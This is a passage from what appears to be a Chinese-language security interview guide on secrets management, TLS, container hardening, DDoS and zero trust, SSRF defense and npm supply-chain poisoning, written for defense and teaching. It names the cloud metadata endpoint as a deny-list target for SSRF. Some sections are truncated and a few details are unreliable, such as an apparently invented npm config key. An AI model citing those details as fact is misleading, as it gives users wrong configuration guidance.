  • DataLoader + N+1：即使客户端没有恶意查询，GraphQL 的 N+1 问题也会导致性能问题。DataLoader（批处理 + 缓存）是解决 N+1 的标准方案，同时也是安全防御——防止客户端无意中触发的性能问题。
  • Persisted Queries + CDN 缓存：持久化查询可以用 GET 请求提交（?operationName=...&variables=...），这样 CDN 可以缓存查询结果，显著提升性能。

Q23：密钥管理系统（HashiCorp Vault / AWS KMS / 本地方案）

标准答案

三类方案对比：

维度 HashiCorp Vault AWS KMS / Secrets Manager 本地方案（git-crypt / SOPS）
类型 集中式 secrets 管理 云托管 KMS/secrets 文件级加密
动态密钥 支持（动态数据库凭证） 支持（自动轮换） 不支持
审计 完善 完善（CloudTrail） 有限
部署复杂度 高 低（托管服务） 低
适用场景 多云/混合云、复杂策略 单一云、Serverless 小型项目、配置文件

HashiCorp Vault 核心特性：

  • 动态 Secrets：应用请求数据库密码时，Vault 动态创建临时用户，TTL 到期自动删除
  • 加密即服务（Encryption as a Service）：应用调用 Vault 加密数据，无需管理密钥
  • 多认证后端：Token、Kubernetes Service Account、AWS IAM、LDAP
  • Secret Engines：KV、数据库、AWS、PKI、SSH
  • Auto-unseal：和云 KMS 集成自动解封

AWS KMS 核心能力：

  • 托管密钥生成、存储和轮换
  • 信封加密（Envelope Encryption）：数据密钥加密数据，主密钥加密数据密钥
  • 与 AWS 服务原生集成（S3、Lambda、DynamoDB）

本地方案（HashiCorp Vault 的轻量替代）：

  • git-crypt：用 Git 进行透明加密，适合配置文件
  • SOPS（Mozilla SOPS）：加密 YAML/JSON/ENV 文件，支持 PGP/AWS KMS/GCP KMS
  • 环境变量 + 加密存储：.env 文件做基础 secrets 管理

选择建议：

  • Kubernetes 部署的分布式系统 → Vault（Operator + CSI Provider）
  • 全 AWS 环境 + Serverless → AWS Secrets Manager + Parameter Store
  • 单体应用/初创团队 → 环境变量 + SOPS

深入思考

  • Vault 的运维成本：Vault 需要高可用集群、存储后端（Consul/Raft）、自动解封、备份。对团队运营能力要求高。小团队直接上 Vault 可能适得其反。
  • 信封加密（Envelope Encryption）：KMS 每次加密操作有 4KB 的 Payload 限制，且 API 调用有成本。信封加密模式：使用 KMS 加密 DEK（Data Encryption Key），再用 DEK 加密实际数据。DEK 缓存在本地，减少 KMS API 调用。
  • 不可变基础设施中的密钥管理：容器/Pod 启动时从 Vault 拉取密钥，不在镜像中保存任何密钥。使用 Sidecar 模式或 Init Container。

Q24：Secrets 轮换策略与实践

标准答案

轮换的核心原则：将 secrets 的生命周期缩短到”泄露无害”的程度。

轮换策略：

  1. 静态密钥轮换（数据库密码、API Key）：

    • 手动轮换：更新 → 重启服务
    • 双密钥模式：新旧密钥同时有效，确保切换过程无中断

  2. 动态密钥轮换（Vault 类型）：

    • 每次请求获取临时凭据
    • TTL 到期后自动失效
    • 不需要手动轮换——天生轮换

  3. 自动轮换（AWS Secrets Manager）：

    • 配置 Lambda 函数实现自动轮换
    • 支持 RDS 等数据库密码的自动化轮换

轮换策略检查清单：

  • 读取 secrets 是否需要重启/重新部署？
  • 是否支持双密钥并行有效？
  • 是否有回滚机制（旧密钥在新密钥出问题时能用）？
  • 审计日志是否记录了每次轮换？
  • 紧急轮换流程（泄露发生时，5 分钟内完成）是否就绪？

深入思考

  • 轮换频率：传统建议是 90 天。但在现代零信任模型下，推荐使用动态/短期凭据来代替轮换（如 Vault 动态数据库密码、STS 临时凭证）。
  • 手动轮换的风险：很多系统轮换流程全靠运维文档，没有自动化。当真正需要轮换时（泄露事件），手动操作容易出错。没有自动化的轮换等于没有轮换。
  • Git 历史中的 Secrets：如果曾经有密钥被提交到 Git，即使删除和 .gitignore 也没用，密钥已经暴露。使用 git filter-branch 或 BFG Repo-Cleaner 从头清理，并吊销该密钥。

Q25：.env 安全和证书管理

标准答案

.env 文件安全规范：

  1. 永不提交 Git：.env 在 .gitignore 中，使用 .env.example 作为模板提交
  2. 加密存储：敏感值使用 SOPS 或 git-crypt 加密
  3. 生产环境不使用 .env：生产环境用 Vault/AWS Secrets Manager 替代 .env
  4. 审计：使用 .env diff 检查工具防止误提交
  5. 最低权限：每个环境使用独立的 .env，不共享生产密钥

证书管理：

  1. Let’s Encrypt + ACME 自动化：

    • 90 天有效期，自动续签
    • DNS-01 挑战支持通配符证书

  2. mTLS（双向 TLS）：服务间通信认证

    • 客户端和服务端都需出示证书
    • 部署方式：Sidecar（Envoy/Istio）、应用层直接配置
    • 生产最佳实践：证书轮换自动化（cert-manager + Vault PKI）

  3. 证书固定（Certificate Pinning）：

    • 优点：防止 CA 被攻陷后的中间人攻击
    • 缺点：证书更换时需要更新客户端，容易引发大规模故障
    • 建议：使用 HPKP 已废弃，推荐使用 Certificate Transparency 和 CAA Records 替代
    • 移动端：对高频 API 做 SHA-256 公钥固定，配合备份/备用证书

深入思考

  • cert-manager + Let’s Encrypt + Kubernetes：生产标准做法。cert-manager 自动管理 kubernetes.io/tls secrets，支持 DNS-01 挑战（需要配置 DNS provider）。
  • CAA Record：DNS 层面限制哪些 CA 可以为你的域名签发证书。防止 CA 被攻陷后恶意签发你的证书。
  • 证书过期事故：这是最常见的生产事故之一。必须有监控（expiry_date < 30 days）和自动化续签。使用 openssl s_client 或 cert-manager 的状态监控。

Q28：Docker 镜像安全

标准答案

四大原则：

  1. 最小基础镜像：

    • 镜像越小，攻击面越小
    • Distroless 镜像不含 shell 和 apt，无法执行任意命令

  2. 多阶段构建：

    • 构建阶段使用完整工具链
    • 运行阶段只拷贝编译产物，不含编译器、依赖等

  3. 非 root 运行：

    • 默认容器以 root 运行，容器逃逸后 root 权限直达宿主机
    • 始终创建专用用户运行应用
    • 限制容器 capability（--cap-drop=ALL --cap-add=NET_BIND_SERVICE）

  4. 镜像签名与扫描：

    • 使用 Cosign 签名镜像，确保完整性
    • CI 中集成 Trivy/Grype 扫描镜像漏洞
    • 使用 OPA 策略阻止高危漏洞镜像部署

深入思考

  • Distroless 的问题：没有 shell 和调试工具，生产排错困难。折中方案：使用 Alpine（带 shell 但更小），或准备调试用 Sidecar 容器。
  • Rootless Container：Docker 和 Podman 支持 rootless 模式，容器进程以非 root 用户运行，进一步降低了容器逃逸风险。
  • Base Image 版本追踪：不要用 :latest，始终锁定具体版本（alpine:3.19.1），并用 renovate/dependabot 管理更新。

Q29：软件签名（Sigstore / Cosign）和 Dependency Confusion

标准答案

Sigstore 生态：
Sigstore 是一套开源工具，用于签名、验证和保护软件供应链：

  • Cosign：容器镜像和制品的签名工具
  • Fulcio：代码签名的 CA（证书颁发机构），基于 OIDC 签发短期证书
  • Rekor：透明度日志，记录所有签名事件

Dependency Confusion 攻击：

攻击原理：企业在使用私有包时，如果私有包名与公共注册表（npm/PyPI）中的包名冲突，包管理器可能误将公共包的恶意版本拉入项目。

防御措施：

  1. 命名空间隔离：使用 @scope（npm）、__（Python）区分私有包
  2. 注册表优先级明确：npm 使用 --registry 指定私服，或配置 npmrc 仅从私服安装
  3. Dependency Confusion 扫描：使用工具扫描你的依赖名是否在公共注册表中存在
  4. 锁文件（lockfile）：锁定依赖版本，避免被恶意”新版本”替代
  5. 私有注册表鉴权：确保私有注册表需要认证，防止外部访问

深入思考

  • Keyless Signing 的革新：传统的软件签名依赖”信任根”（密钥），密钥管理成问题。Sigstore 的 Keyless 模式用 OIDC 身份（GitHub/GitLab/Google）绑定签名，不需要传统的长生命周期密钥，这是供应链安全的重大进步。
  • Dependency Confusion 真实案例：2022 年多家大公司受到攻击，攻击者在 npm/PyPI 上传了企业私有包的同名版本。
  • 包管理器配置检查清单：
    • 是否有 .npmrc 配置了私有源？
    • lockfile 是否提交到 Git？
    • CI 安装依赖时是否使用了正确的源？
    • 是否扫描了 public registry 上的同包名冲突？

Q30：TLS / mTLS 原理

标准答案

TLS 握手（1.3 简化版）：

  1. ClientHello：客户端发送支持的 TLS 版本、密码套件列表、DH key_share
  2. ServerHello：服务端选定参数、发送证书链（含公钥）、DH key_share 和服务端签名
  3. 证书验证：客户端验证服务端证书链（信任锚 → 中间 CA → 服务端证书）
  4. 密钥协商：ECDHE 密钥交换（前向安全性），生成会话密钥
  5. Finished：确认握手消息未被篡改

mTLS（双向 TLS）：在一端验证之外，客户端也出示证书。

  • 服务端在握手时发送 CertificateRequest
  • 客户端发送自己的证书和签名证明

核心概念：

  • 证书链（Certificate Chain）：根 CA → 中间 CA → 服务器证书
  • 密码套件（Cipher Suite）：
    • TLS 1.2：TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
    • TLS 1.3：简化，握手时协商 AEAD + HKDF
  • 前向安全性（PFS）：ECDHE 密钥交换确保即使私钥泄露，过去的会话也无法解密

深入思考

  • TLS 1.2 vs 1.3：1.3 将握手从 2-RTT 降到 1-RTT（和 0-RTT 会话恢复），移除了不安全算法（RC4、3DES、CBC-mode）。2025 年应完全禁用 1.0/1.1。TLS 1.2 作为兼容降级选项保留，但推荐只使用 1.3。
  • mTLS 的部署位置：在 Sidecar 模式（Envoy/Istio/Linkerd）中，服务间 mTLS 在 Sidecar 层处理，应用代码无感知。也可以直接在应用层实现（gRPC 原生支持 mTLS）。
  • 证书轮换的挑战：mTLS 在微服务规模下（几千个服务实例），证书轮换必须自动化。cert-manager 和 SPIFFE/SPIRE 生态解决了这个问题。

参考链接

  • RFC 8446 - TLS 1.3
  • Cloudflare TLS 1.3 Explained
  • CNCF SPIFFE/SPIRE: https://spiffe.io/

Q31：HTTPS 证书验证过程

标准答案

当浏览器访问 HTTPS 网站时，证书验证从 TLS 握手开始：

  1. 证书下载：服务端在 TLS 握手中发送证书链（服务器证书 + 中间 CA 证书）
  2. 证书链校验：
    • 验证每个证书的签名（父 CA 签子证书）
    • 验证信任锚（根证书）在浏览器的受信任 CA 列表中
    • （浏览器预装约 100-150 个根证书）
  3. 域名校验：检查证书的 CN 或 SAN（Subject Alternative Name）是否匹配访问的域名
  4. 有效期检查：验证当前时间在 notBefore 和 notAfter 之间
  5. 吊销检查：
    • OCSP（Online Certificate Status Protocol）：实时查询证书状态（但可能被阻断）
    • OCSP Stapling：服务端预先获取 OCSP 响应，在 TLS 握手时一并发送（更好）
    • CRL（Certificate Revocation List）：下载证书吊销列表（不常用，过大）
  6. Certificate Transparency：检查证书是否已记录在公共日志中（SCT 扩展）

深入思考

  • CA 被攻陷怎么办？ Certificate Transparency 就是为了解决这个问题而设计的。所有公开 CA 签发的证书都必须记录到 CT 日志。域名所有者可以监控是否有未经授权的证书签发（通过 CAA 记录限制允许的 CA）。
  • 私有 CA 场景：企业内网使用私有 CA（自签名根证书），需要在所有内部设备上安装私有根证书。许多生产事故源于根证书过期。
  • 自签名证书警告：自签名证书在开发环境方便，但绝不能用于生产。Kubernetes Ingress 的 TLS 配置中应使用 cert-manager + Let’s Encrypt 或外部 CA。

参考链接

  • RFC 5280 - X.509 PKI Certificate and CRL Profile
  • Certificate Transparency: https://certificate.transparency.dev/

Q32：WAF、DDoS 防御与零信任架构

标准答案

WAF（Web Application Firewall）：

WAF 在应用层对 HTTP/HTTPS 流量进行深度检测，防御 OWASP Top 10 等 Web 攻击。

WAF 方案 类型 特点
ModSecurity 开源 传统规则引擎，CRS 规则集
Cloudflare WAF 云 WAF 托管规则 + 机器学习
AWS WAF 云 WAF 与 ALB/CloudFront 原生集成
Coraza 开源 OWASP CRS 兼容，Go 实现，现代架构

DDoS 防御层次（纵深防御）：

  1. 网络层（L3/L4）：ISP 级别的流量清洗、BGP FlowSpec、SYN Proxy
  2. 传输层（L4）：负载均衡器的 SYN Flood 保护、连接数限制
  3. 应用层（L7）：速率限制、WAF、CAPTCHA 挑战
  4. CDN 缓存：静态内容由 CDN 边缘节点响应，源站不受冲击

DDoS 防护策略：

  • 自动缩放：Kubernetes HPA + Cluster Autoscaler 应对流量增长
  • Anycast 网络：流量分散到多个数据中心（Cloudflare 的模型）
  • IP 黑/白名单：已知攻击源 IP 列入黑名单
  • 速率限制：每 IP、每用户、每 API 的精细限流

零信任架构（Zero Trust / BeyondCorp）：

核心原则：永不信任，始终验证（Never trust, always verify）。

  • 不再依赖网络边界（VPN 不再是安全边界）
  • 所有访问请求必须认证 + 授权（无论来源是内网还是外网）
  • 最小权限：按需授予，用完即释放
  • 持续验证：不仅仅是登录时，而是每次请求都验证

Google 的 BeyondCorp 模型：

生产实践：

  • 服务网格（Istio/Linkerd）：服务间的 mTLS + 访问控制策略
  • API Gateway：统一的认证、限流、审计层
  • OPA/Cedar：细粒度的策略决策引擎
  • IAM + 最小权限：云资源访问严格控制

深入思考

  • WAF 的局限性：WAF 依赖规则匹配，对零日攻击、加密 payload、API 层面的逻辑漏洞（如 IDOR）效果有限。需要配合 RASP（Runtime Application Self-Protection）或 API Security 平台。
  • DDoS 的经济账：DDoS 更像是一种”勒索”而非”入侵”——让服务不可用来谈判。2025 年的 DDoS 攻击峰值已超过 3 Tbps。企业需要购买 DDoS 清洗服务（阿里云 Anti-DDoS、Cloudflare、AWS Shield Advanced）。
  • 零信任的实施难度：零信任不仅仅是技术转型，更是组织架构转型。”内网就是安全”的惯性思维需要打破。第一步通常是从”所有内网服务必须认证”开始。

参考链接

  • OWASP CRS: https://coreruleset.org/
  • Google BeyondCorp Papers
  • NIST SP 800-207 (Zero Trust Architecture)

  1. 没有 URL 白名单和协议限制（只验证了 MIME 类型）
  2. 没有阻止对内网 IP 段的请求
  3. AWS 元数据端点 IP（169.254.169.254）未列入黑名单

  • IAM Role 最小权限：应用服务器只需要 S3 指定前缀的 PUT 权限

  • 使用 VPC Endpoint 访问 AWS 服务

深入思考

  • 为什么 SSRF 在云时代更危险？ 因为云元数据端点暴露云服务凭据。在物理机房，SSRF 最多打到 Redis/ES 等内网服务。在云上，SSRF 可能直接获得云平台的 IAM 凭证。
  • SSRF 的防御层次：没有单一防御能 100% 防住。需要”网络层（防火墙/NAT）+ 应用层（URL 校验）+ IAM（最小权限）”三层防御。
  • AWS IMDSv2 的作用：AWS 在 IMDSv2 中引入了 PUT 方法 + TTL 机制，要求先发送 PUT 请求获取 token，再用 token 请求元数据。这能防御大部分 SSRF，但不是万能解药（攻击者可以实现 PUT+GET 两步请求）。

Q35：API 未限流导致 DDoS 事故

事故描述

某电商平台上线了”秒杀”功能，API 设计为：

上线后，攻击者用 10000 个代理 IP 同时请求，每个 IP 每秒发 5 个请求（总计 50000 RPS）。由于没有限流，数据库连接池被耗尽，应用服务器 CPU 100%，数据库死锁。

更糟糕的是：

  • 正常用户的所有请求都超时（包括查看商品页面）
  • 自动扩容触发后也瞬间被打满
  • 数据库主库彻底 hang 住，持续 2 小时恢复

根因分析：

  1. 没有全局速率限制
  2. 没有用户级别限流
  3. 没有数据库连接池监控和熔断
  4. 自动扩容策略没有上限

修复方案：

  1. 三层限流架构：

  1. 秒杀接口特殊处理：

    • 使用消息队列削峰（请求入队列，异步处理）
    • 预扣库存（Redis 原子操作），异步落库
    • 使用 Token Bucket 做准入控制

  2. 数据库保护：

    • 连接池上限（HikariCP max=20）
    • 读写分离（秒杀写走主库，秒杀页读走从库/Redis）
    • 限流到数据库层面（pt-query-digest 监控慢查询）

深入思考

  • 限流 vs 熔断 vs 降级：限流（主动控制入口流量）、熔断（被动保护下游，当出现高错误率/高延迟时切断调用）、降级（放弃非核心功能保核心功能）。三者的配合使用至关重要。
  • 秒杀场景的特殊性：秒杀本质上是一个”可控的有损”场景——大部分人会失败，但系统不能崩溃。用”漏斗”模式削峰（网关限流 → 队列排队 → 数据库写入），确保系统弹性。
  • 自动扩容的陷阱：水平扩容解决的是”流量持续增长”问题，不是”突发 DDoS”问题。突发场景需要限流在前，扩容在后。否则扩容速度跟不上攻击速度。

  2. CI 环境没有限定安装源（允许从公共 npm 安装）
  3. npm 缺乏包名保护机制（任何人都可以发布类似包名）
  4. 没有锁文件（lockfile）校验，依赖版本被篡改
  5. 没有扫描 CI 中是否有敏感环境变量

修复方案：

  1. 包名验证：在 package.json 中使用 "allowedPubilshConfig" 或 --registry 限定源
  2. 锁文件：提交 package-lock.json 并 CI 中校验 npm ci（而非 npm install）
  3. CI 环境变量最小化：不在 CI 中存储不需要的 Token
  4. 依赖扫描：CI 中集成 npm audit 或 Snyk 扫描
  5. 作用域包（Scoped Packages）：使用 @mycompany/ 命名空间
  6. Registry 配置：明确指定私有 npm 源

深入思考

  • Typo-squatting 远不止 npm：PyPI、RubyGems、Maven Central 都发现过类似攻击。PyPI 上的 request（拼写错误，正确是 requests）下载量数万次。
  • 维护者账户投毒：比 typo-squatting 更危险的是”劫持已有维护者账户”。攻击者通过钓鱼/社工获取维护者权限，向长期维护的包注入恶意代码。event-stream（npm，2018）和 colors.js（2022）事件就是如此。
  • 防投毒检查清单：
    • 是否使用 lockfile？
    • CI 是否使用 npm ci/pip install --require-hashes？
    • 是否限制了安装源（scope registry）？
    • 是否有 postinstall 脚本审计？
    • 是否扫描已知的 typo-squatting 包？
    • 是否启用了 2FA/MFA 保护发布者账户？
    • 是否使用 sigstore/cosign 验证包签名？
